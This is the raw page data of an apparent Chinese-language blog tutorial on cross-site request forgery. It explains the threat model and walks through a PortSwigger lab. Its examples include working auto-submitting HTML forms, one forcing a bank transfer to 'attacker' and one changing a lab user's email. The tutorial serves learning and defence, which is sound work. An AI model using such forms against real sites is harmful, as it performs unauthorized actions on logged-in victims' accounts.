2:I[55329,["954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","358","static/chunks/bc9e92e6-77345cf2d43ec367.js","250","static/chunks/250-0ef8476c0fa8ee24.js","238","static/chunks/238-f6158f9539c207cd.js","877","static/chunks/app/%5B...slug%5D/page-739b04017f329943.js"],""]
3:I[55942,["954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","358","static/chunks/bc9e92e6-77345cf2d43ec367.js","250","static/chunks/250-0ef8476c0fa8ee24.js","238","static/chunks/238-f6158f9539c207cd.js","877","static/chunks/app/%5B...slug%5D/page-739b04017f329943.js"],""]
4:"$Sreact.suspense"
6:I[30389,["954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","358","static/chunks/bc9e92e6-77345cf2d43ec367.js","250","static/chunks/250-0ef8476c0fa8ee24.js","238","static/chunks/238-f6158f9539c207cd.js","877","static/chunks/app/%5B...slug%5D/page-739b04017f329943.js"],""]
7:I[5613,[],""]
9:I[31778,[],""]
a:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-567a36be9f938b4f.js"],"GlobalProvider"]
b:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-567a36be9f938b4f.js"],""]
8:["slug","24b/cross-site-request-forgery","c"]
0:["gFWaWxsSFCS-10d7IhkPO",[[["",{"children":[["slug","24b/cross-site-request-forgery","c"],{"children":["__PAGE__?{\"slug\":[\"24b\",\"cross-site-request-forgery\"]}",{}]}]},"$undefined","$undefined",true],["",{"children":[["slug","24b/cross-site-request-forgery","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],["$","div",null,{"id":"post-layout","children":[false,["$","div",null,{"id":"main","className":"y-center-wrapper","children":[["$","h1",null,{"className":"x-title","children":"Learn CSRF"}],["$","$L3",null,{"path":"/24b/cross-site-request-forgery/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading..."}],"children":["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}]}]]}],["$","$L6",null,{}]]}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/419d53ba9cede1bf.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$La",null,{"children":[["$","$Lb",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","div",null,{"id":"notfound-404","children":"404"}],["$","div",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/0f7cce8b0dae9908.css","precedence":"next","crossOrigin":""}]],"styles":null}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/54d581b7516b52b4.css","precedence":"next","crossOrigin":""}]],"$Lc"]]]]
d:I[74365,["954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","358","static/chunks/bc9e92e6-77345cf2d43ec367.js","250","static/chunks/250-0ef8476c0fa8ee24.js","238","static/chunks/238-f6158f9539c207cd.js","877","static/chunks/app/%5B...slug%5D/page-739b04017f329943.js"],""]
e:I[62029,["954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","358","static/chunks/bc9e92e6-77345cf2d43ec367.js","250","static/chunks/250-0ef8476c0fa8ee24.js","238","static/chunks/238-f6158f9539c207cd.js","877","static/chunks/app/%5B...slug%5D/page-739b04017f329943.js"],""]
f:Tee3,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.mybank.com/transfer<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>to<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attacker<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>amount<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
            document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
10:T960,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://0a7f00ed032da08580297635009a00f7.web-security-academy.net/my-account/change-email<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>abcd@abcd.com<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
5:[["$","h2",null,{"className":"x-h1","children":"概念与威胁模型"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<span class=\"x-inline-strong\">跨站请求伪造</span><code class=\"x-inline-highlight\">(Cross-site Request Forgery, CSRF)</code>是一种冒充受信任用户，向服务器发送非预期请求的攻击方式。CSRF主要利用浏览器会自动携带cookie的特性。"}}],["$","$Ld",null,{"src":"csrf.jpg","width":"600px","filterDarkTheme":true}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"1."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"用户登录网站，例如银行网站；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"2."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"网站返回cookie用于验证身份；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"3."}],["$","div",null,{"className":"x-oli-content-wrapper","children":[["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"假设银行转账的请求形式是："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"http://www.mybank.com/transfer?to=[SomeAccount]&amount=[SomeAmount]"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"http://www.mybank.com/transfer?to=[SomeAccount]&amp;amount=[SomeAmount]"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"攻击者如果知道此形式（这是容易的），就可以构造一个恶意站点，这个站点会发送请求："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"Plain Text"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"http://www.mybank.com/transfer?to=attacker&amount=1000"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"http://www.mybank.com/transfer?to=attacker&amp;amount=1000"}}]}]]}]]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"4."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"用户访问恶意站点时，触发了这个请求；"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"5."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"由于用户经过登录后存有用于验证身份的cookie，服务器会认为请求是有效的，因而导致了非预期操作的发生。"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"恶意站点构造可能如下："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<html>\n    <body>\n        <form action=\"https://www.mybank.com/transfer\" method=\"POST\">\n            <input type=\"hidden\" name=\"to\" value=\"attacker\" />\n            <input type=\"hidden\" name=\"amount\" value=\"1000\" />\n        </form>\n        <script>\n            document.forms[0].submit();\n        </script>\n    </body>\n</html>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$f"}}]}]]}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"当用户访问这个页面时，<code class=\"x-inline-highlight\">POST</code>请求会被触发；如果用户登录了<code class=\"x-inline-highlight\">www.mybank.com</code>，请求时会自动带上cookie；<code class=\"x-inline-highlight\">www.mybank.com</code>认为这是用户的请求，因而将其作为正常请求处理。"}}],["$","h2",null,{"className":"x-h1","children":"练习"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"下文给出的PortSwigger靶场中有关CSRF的Lab目标是构造一个恶意站点，更改访问它的用户的邮箱地址。<br/>攻击者可以通过账号<code class=\"x-inline-highlight\">wiener:peter</code>了解网络请求结构。"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"<a href=\"https://portswigger.net/web-security/csrf/lab-no-defenses\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">PortSwigger Lab: CSRF vulnerability with no defenses</a>"}}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"攻击者有一个<code class=\"x-inline-highlight\">exploit-server</code>服务器（如下图），其中的<code class=\"x-inline-highlight\">/exploit</code>页面发送给受害用户访问，Lab的目标是编写<code class=\"x-inline-highlight\">/exploit</code>页面，让访问到的用户的邮箱地址被更改。"}}],["$","$Ld",null,{"src":"env.jpg","width":"100%"}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"1."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"登录账号<code class=\"x-inline-highlight\">wiener:peter</code>，使用更新邮箱功能，观察网络请求，发现请求的接口是<code class=\"x-inline-highlight\">/my-account/change-email</code>，并携带参数<code class=\"x-inline-highlight\">email</code>："}}]}]]}],["$","$Ld",null,{"src":"1-1.jpg","width":"100%"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"根据上述发现，构造一个立即提交的表单请求，<code class=\"x-inline-highlight\">action</code>为有漏洞网站的地址："}}],["$","div",null,{"className":"x-codeblock","children":[["$","div",null,{"className":"x-codeblock-header","children":[["$","div",null,{"className":"x-codeblock-header-language","children":"HTML"}],["$","$Le",null,{"className":"x-codeblock-header-copy","text":"<form action=\"https://0a7f00ed032da08580297635009a00f7.web-security-academy.net/my-account/change-email\" method=\"post\">\n    <input type=\"hidden\" name=\"email\" value=\"abcd@abcd.com\"/>\n</form>\n<script>\n    document.forms[0].submit();\n</script>\n"}]]}],["$","pre",null,{"style":{"background":null},"children":["$","code",null,{"dangerouslySetInnerHTML":{"__html":"$10"}}]}]]}],["$","div",null,{"className":"x-oli","children":[["$","div",null,{"className":"x-oli-number","children":"2."}],["$","div",null,{"className":"x-oli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"提交通过。"}}]}]]}],["$","$Ld",null,{"src":"1-2.jpg","width":"100%"}],["$","h2",null,{"className":"x-h1","children":"参考资料"}],["$","p",null,{"className":"x-p","dangerouslySetInnerHTML":{"__html":"本文的插图和例子来源于："}}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://medium.com/@rajeevranjancom/cross-site-request-forgery-csrf-attack-6949edb9e405\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">Cross site request forgery (CSRF) attack</a>"}}]}]]}],["$","div",null,{"className":"x-uli","children":[["$","div",null,{"className":"x-uli-marker","children":["$","div",null,{"className":"x-uli-marker-dot"}]}],["$","div",null,{"className":"x-uli-content-wrapper","children":["$","p",null,{"dangerouslySetInnerHTML":{"__html":"<a href=\"https://portswigger.net/web-security/csrf\" target=\"_blank\" rel=\"noreferrer\" class=\"x-inline-link\">Portswigger - What is CSRF (Cross-site request forgery)?</a>"}}]}]]}]]
c:[["$","meta","0",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","1",{"charSet":"utf-8"}],["$","title","2",{"children":"Learn CSRF - 铃木的网络日记"}],["$","link","3",{"rel":"canonical","href":"https://1kuzus.github.io/24b/cross-site-request-forgery/"}]]
1:null
